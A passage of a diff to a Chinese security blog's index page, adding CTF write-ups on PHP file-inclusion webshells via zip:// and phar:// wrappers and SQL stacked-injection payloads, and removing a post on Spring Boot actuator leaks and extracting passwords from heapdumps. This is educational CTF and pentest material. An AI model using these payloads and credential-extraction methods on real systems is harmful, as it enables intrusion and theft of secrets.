+<p><strong>cmd=system(“ls /”);</strong></p>
+<p><strong>注意：</strong></p>
+<p>1.“901edcb2cb7e73704f556f4c50d8b1ee3e7f428d.jpg”是上传文件返回的文件名</p>
+<p>2.要访问压缩包里面的木马文件，还需要使用#来分割。由于get方式中，#是作为定位符#的url编码是%23。这里是#1，这sehll上传的问题名。</p>
+<p>3.这里zip协议后面跟的是./（相对路径）；要想获得绝对路径可以通过爆破与路径扫描等方法获取。</p>
+<p>4.因为是php，传入的命令后面要加 <strong>;</strong></p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130160716930.png" alt="image-20231130160716930"></p>
+<p>获取到flag在flllaggggggggg_isssssssssss_heeeeeeeeeere里</p>
+<p>再利用zip协议访问上传的木马文件，获取flag</p>
+<p><strong>Payload：</strong></p>
+<p><strong>cmd=system(“cat /flllaggggggggg_isssssssssss_heeeeeeeeeere”);</strong></p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130160745928.png" alt="image-20231130160745928"></p>
+<ul>
+<li><strong>Phar协议</strong></li>
+</ul>
+<p>Payload page=phar://./assets/img/upload/87a966a1afab6309772f2c6d74525b85a26fed80.jpg/shell</p>
+<p><strong>其他的操作一样</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -179,10 +413,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-11-13 16:44:53 / 修改时间：17:00:23" itemprop="dateCreated datePublished" datetime="2023-11-13T16:44:53+08:00">2023-11-13</time>
+              <time title="创建时间：2023-11-13 16:44:53" itemprop="dateCreated datePublished" datetime="2023-11-13T16:44:53+08:00">2023-11-13</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-30 16:09:29" itemprop="dateModified" datetime="2023-11-30T16:09:29+08:00">2023-11-30</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -204,7 +444,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="SQL注入-BUUCTF-SQL注入题解"><a href="#SQL注入-BUUCTF-SQL注入题解" class="headerlink" title="SQL注入|BUUCTF SQL注入题解"></a>SQL注入|BUUCTF SQL注入题解</h1><p>[[极客大挑战 2019]EasySQL 1](#[极客大挑战 2019]EasySQL 1)</p>
+          <h1 id="BUUCTF-SQL注入题集"><a href="#BUUCTF-SQL注入题集" class="headerlink" title="BUUCTF|SQL注入题集"></a>BUUCTF|SQL注入题集</h1><p>[[极客大挑战 2019]EasySQL 1](#[极客大挑战 2019]EasySQL 1)</p>
 <p>[[SUCTF 2019]EasySQL](#[SUCTF 2019]EasySQL)</p>
 <p>[[极客大挑战 2019]BabySQL](#[极客大挑战 2019]BabySQL)</p>
 <p>[[极客大挑战 2019]LoveSQL](#[极客大挑战 2019]LoveSQL)</p>
@@ -228,11 +468,11 @@
 <p>尝试普通的sql注入，返回均为Nonono</p>
 <p><strong>解法：堆叠注入</strong></p>
 <p>l  查数据库</p>
-<p><strong>payload</strong>：database()#  或者 1,database()# 或者1; database()#等都可</p>
+<p><strong>payload</strong>：database()#  或者 1,database()# 或者1;show databases#等都可</p>
 <p>“#”可以用“;”替换。</p>
 <p>l  payload：1,database()#的结果</p>
 <p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image007.png" alt="img"></p>
-<p>l  payload :1; database()；的结果</p>
+<p>l  payload :1; show databases；的结果</p>
 <p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164737704.png" alt="image-20231113164737704"></p>
 <p><strong>获得数据库名：ctf</strong></p>
 <p>l  查表明</p>
@@ -1516,221 +1756,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="post-title-link" itemprop="url">实战|SpringBoot敏感信息泄露</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-13 20:25:47" itemprop="dateCreated datePublished" datetime="2023-08-13T20:25:47+08:00">2023-08-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-14 21:03:25" itemprop="dateModified" datetime="2023-08-14T21:03:25+08:00">2023-08-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="攻防演练-Springboot信息泄露"><a href="#攻防演练-Springboot信息泄露" class="headerlink" title="攻防演练|Springboot信息泄露"></a>攻防演练|Springboot信息泄露</h1><p><strong>免责声明</strong></p>
-<p><strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
-<h2 id="SpringBoot敏感目录介绍"><a href="#SpringBoot敏感目录介绍" class="headerlink" title="SpringBoot敏感目录介绍"></a>SpringBoot敏感目录介绍</h2><ul>
-<li><p> <strong>/trace</strong>：显示最近的 http 包信息，可能泄露当前系统存活的 Cookie 信息。</p>
-</li>
-<li><p> <strong>/heapdump</strong>：JVM 内存信息，分析出明文密码。</p>
-</li>
-<li><p> <strong>/env、/actuator/env</strong></p>
-</li>
-</ul>
-<p>​        应用的环境信息，包含 Profile、系统环境变量和应用的 properties 信息，可能泄露明文密码与接口信息。<strong>GET</strong> <strong>请求</strong> /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 <strong>POST</strong> <strong>请求</strong> /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
-<ul>
-<li>l <strong>/refresh、/actuator/refresh</strong></li>
-</ul>
-<p>​        POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。</p>
-<ul>
-<li> <strong>/restart、/actuator/restart</strong></li>
-</ul>
-<p>​        暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。</p>
-<ul>
-<li> <strong>/jolokia、/actuator/jolokia</strong></li>
-</ul>
-<p>​        可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
-<ul>
-<li> <strong>/trace、/actuator/httptrace</strong></li>
-</ul>
-<p>​        一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
-<p>汇总：</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>路径</th>
-<th>描述门</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>get</td>
-<td>/autoconfig</td>
-<td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过台</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/configprops</td>
-<td>描述配置属性 (包含默认值) 如何注入 Beane</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/beans</td>
-<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/dump</td>
-<td>获取线程活动的快照</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/env</td>
-<td>获取全部环境属性</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/env/{name}</td>
-<td>根据名称获取特定的环境属性值</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/health</td>
-<td>报告应用程序的健康指标，这些值由 Healthindicator 的实现类提供</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/info</td>
-<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/mappings</td>
-<td>描述全部的 URI路径，以及它们和控制器 (包含 Actuator 端点) 的映射关系</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/metrics</td>
-<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/metrics{name}</td>
-<td>报告指定名称的应用程序度量值</td>
-</tr>
-<tr>
-<td>post</td>
-<td>/shutdown</td>
-<td>关闭应用程序，要求 endpointsshutdown.enabled 设置为 true (默认为 false)</td>
-</tr>
-<tr>
-<td>get</td>
-<td>/trace</td>
-<td>提供基本的 HTTP 请求跟踪信息 (时间戳、HTTP 头等)</td>
-</tr>
-</tbody></table>
-<h2 id="HeapDump数据泄露"><a href="#HeapDump数据泄露" class="headerlink" title="HeapDump数据泄露"></a>HeapDump数据泄露</h2><h3 id="heapDump常见泄露敏感信息"><a href="#heapDump常见泄露敏感信息" class="headerlink" title="heapDump常见泄露敏感信息"></a><strong>heapDump常见泄露敏感信息</strong></h3><ul>
-<li><p>各种数据库的明文密，如，mysql数据库</p>
-</li>
-<li><p>redis密码</p>
-</li>
-<li><p>Shiro的key</p>
-</li>
-<li><p>后台用户账号密码泄露</p>
-</li>
-<li><p>服务器链接的key</p>
-</li>
-<li><p>ssh密码</p>
-</li>
-</ul>
-<h3 id="敏感信息提取与星号数据脱敏"><a href="#敏感信息提取与星号数据脱敏" class="headerlink" title="敏感信息提取与星号数据脱敏"></a>敏感信息提取与星号数据脱敏</h3><h4 id="方法1：用-heapdump-tool-jar-工具脱敏"><a href="#方法1：用-heapdump-tool-jar-工具脱敏" class="headerlink" title="方法1：用 heapdump_tool.jar 工具脱敏"></a><strong>方法1：用 heapdump_tool.jar 工具脱敏</strong></h4><p><strong>对 Heapdump 进行分析。</strong></p>
-<p><strong>heapdump_tool.jar</strong> 是基于 jhat，通过 jhat 解析 heapdump 文件，所以建议 jdk 版本为 1.8。<br> 使用方法：*<strong>java -jar heapdump_tool.jar heapdump*</strong><br> 查询方式：</p>
-<ul>
-<li>关键词：如 password</li>
-<li> 字符长度：如 len=10 获取长度为 10 的所有 key 或者 value 值</li>
-<li>按顺序获取 ：如 num=1-100 获取顺序 1-100 的字符</li>
-<li>命令：</li>
-</ul>
-<p>​            geturl：获取所有字符串中的 url</p>
-<p>​            getfile：获取所有字符串中的文件路径文件名</p>
-<p>​            getip：获取所有字符串中的 ip</p>
-<p><em>默认不输出查询结果非 key-value 格式的数据，需要获取所有值，输入all=true、all=false取消显示所有值。</em></p>
-<p>*<em>根据/env的星星敏感数据进行搜索查询**</em></p>
-<p><img src="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20230813203654640.png" alt="image-20230813203654640">     </p>
-<p> <img src="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20230813203659487.png" alt="image-20230813203659487"></p>
-<h4 id="方法2：利用MemoryAnalyzer可视化工具"><a href="#方法2：利用MemoryAnalyzer可视化工具" class="headerlink" title="方法2：利用MemoryAnalyzer可视化工具"></a>方法2：利用MemoryAnalyzer可视化工具</h4><p>查询语法：<code>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</code></p>
-<p><img src="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20230814201949831.png" alt="image-20230814201949831"></p>
-<p>其他脱敏方法可以参考文章：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1800,7 +1825,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-count">87</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
